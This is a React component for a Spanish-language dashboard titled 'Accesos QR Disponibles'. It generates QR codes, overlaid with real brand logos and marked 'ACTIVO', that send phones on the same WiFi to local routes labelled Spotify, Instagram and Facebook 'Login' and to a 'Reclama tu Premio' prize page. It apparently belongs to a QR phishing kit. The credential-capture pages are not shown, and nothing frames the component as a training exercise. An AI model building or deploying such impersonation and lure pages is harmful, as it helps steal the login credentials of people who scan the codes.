import { Box, Heading, SimpleGrid, Text, VStack, Button, Icon, Flex, Badge, Card, CardBody } from '@chakra-ui/react';
import { Link as RouterLink } from 'react-router-dom';
import QRCode from 'react-qr-code';

const ExternalLinkIcon = () => (
    <Icon viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></Icon>
);

const QrCard = ({ title, path, color, logo }: { title: string; path: string; color: string; logo?: string }) => {
    // Explicitly use the local IP for the QR code value so it works on mobile
    const fullUrl = `http://localhost${path}`;

    return (
        <Card borderRadius="xl" overflow="hidden" variant="outline" bg="white" boxShadow="sm">
            <CardBody>
                <VStack align="center" spacing={4}>
                    <Flex justify="space-between" w="full" align="center">
                        <Badge colorScheme={color} fontSize="0.8em" px={2} py={1} borderRadius="md">
                            ACTIVO
                        </Badge>
                    </Flex>

                    <Box p={4} bg="white" borderRadius="lg" boxShadow="md" position="relative">
                        <QRCode value={fullUrl} size={180} />

                        {/* Center Logo Overlay */}
                        {logo && (
                            <Box
                                position="absolute"
                                top="50%"
                                left="50%"
                                transform="translate(-50%, -50%)"
                                bg="white"
                                p={1}
                                borderRadius="full"
                                boxShadow="sm"
                            >
                                <Box
                                    as="img"
                                    src={logo}
                                    w="40px"
                                    h="40px"
                                    objectFit="contain"
                                    borderRadius="full"
                                />
                            </Box>
                        )}
                    </Box>

                    <Box textAlign="center">
                        <Heading size="md" mb={1}>{title}</Heading>
                        <Text fontSize="xs" color="gray.500" fontFamily="monospace" wordBreak="break-all">
                            {fullUrl}
                        </Text>
                    </Box>

                    <Button
                        as={RouterLink}
                        to={path}
                        target="_blank"
                        rightIcon={<ExternalLinkIcon />}
                        width="full"
                        size="sm"
                        variant="solid"
                        colorScheme="gray"
                    >
                        Abrir Página
                    </Button>
                </VStack>
            </CardBody>
        </Card>
    );
};

export const QrPagesPage = () => {
    return (
        <Box p={8}>
            <Flex justify="space-between" align="center" mb={8}>
                <Box>
                    <Heading size="lg" mb={2}>Accesos QR Disponibles</Heading>
                    <Text color="gray.600">
                        Escanea el código con tu celular (debe estar en la misma red WiFi).
                    </Text>
                </Box>
            </Flex>

            <SimpleGrid columns={{ base: 1, md: 2, lg: 3 }} spacing={6}>
                <QrCard
                    title="Spotify Login"
                    path="/spotify"
                    color="green"
                    logo="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg"
                />
                <QrCard
                    title="Instagram Login"
                    path="/instagram"
                    color="pink"
                    logo="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"
                />

                <QrCard
                    title="Reclama tu Premio"
                    path="/premio"
                    color="purple"
                    logo="https://images.seeklogo.com/logo-png/45/1/sonesta-logo-png_seeklogo-451426.png"
                />

                <QrCard
                    title="Facebook Login"
                    path="/facebook"
                    color="facebook"
                    logo="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
                />


            </SimpleGrid>
        </Box>
    );
};
